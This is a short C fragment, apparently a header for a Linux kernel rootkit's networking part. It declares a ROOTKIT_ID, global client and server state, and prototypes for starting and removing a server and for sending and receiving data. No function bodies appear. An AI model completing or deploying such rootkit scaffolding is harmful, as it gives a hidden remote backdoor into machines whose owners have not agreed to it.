#include <linux/in.h>
#include <linux/inet.h>
#include <linux/socket.h>
#include <net/sock.h>

#include <linux/string.h>

extern int BUFFER_SIZE; //size of buffers used
extern char ROOTKIT_ID[];

/*server functions*/
struct client_t client; //global variable holding data associated with client for easy access by all functions
struct server_t server; //global variable holding data associated with server for easy access by all functions
static int run_server(void *port); //creates the server
static int remove_server(void); //removes the server
static int net_send(void); //sends data to the server
static int net_recv(void); //recieves data from server

static int client_handler(void); //handles the client
